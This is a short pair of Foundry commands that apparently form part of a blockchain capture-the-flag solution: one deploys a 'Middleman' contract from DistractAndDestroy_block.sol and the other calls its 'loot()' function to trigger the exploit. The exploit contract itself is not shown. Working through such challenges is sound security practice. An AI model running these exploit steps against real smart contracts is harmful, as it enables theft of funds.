forge create DistractAndDestroy_block.sol:Middleman --private-key $pkey --rpc-url $rurl --broadcast

cast send $middleman "loot()" --private-key $pkey --rpc-url $rpc